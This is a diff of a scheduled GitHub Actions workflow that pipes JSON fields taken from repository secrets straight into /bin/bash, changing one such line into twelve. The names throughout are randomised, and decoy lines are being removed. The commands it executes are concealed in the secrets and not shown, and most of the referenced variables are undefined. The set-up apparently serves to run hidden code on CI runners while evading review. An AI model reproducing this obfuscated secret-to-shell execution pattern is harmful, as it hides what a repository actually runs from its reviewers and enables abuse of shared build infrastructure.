@@ -2,19 +2,27 @@ name: zhuwushan1989
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
+    - cron: '4 4/6 * * *'
 
-jobs:  # 18677
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhuwushan1989
         env:
-          s19872: ${{ secrets.s19872 }}
+          cc6576: ${{ secrets.cc6576 }}
         run: |
-          which cat | export GGGGG=
-          echo $s19872 | jq -r .l20552 | /bin/bash
-          pushd ~ > /dev/null
-          echo "Checksum: $((1000 + RANDOM % 9000))"
+          echo $cc6576 | jq -r .riy16696 | /bin/bash
+          echo $uj0698 | jq -r .p423 | /bin/bash
+          echo $cfl8142 | jq -r .jmz854 | /bin/bash
+          echo $l754 | jq -r .vgaxa283 | /bin/bash
+          echo $fbc18419 | jq -r .n5626 | /bin/bash
+          echo $k551 | jq -r .ghz13465 | /bin/bash
+          echo $dd46956 | jq -r .skuvy2119 | /bin/bash
+          echo $mh0 | jq -r .yo5988 | /bin/bash
+          echo $gr49 | jq -r .voyk45452 | /bin/bash
+          echo $ispuk799 | jq -r .yists6094 | /bin/bash
+          echo $mo2441 | jq -r .msvoc72080 | /bin/bash
+          echo $ah9 | jq -r .xtlz177 | /bin/bash
+
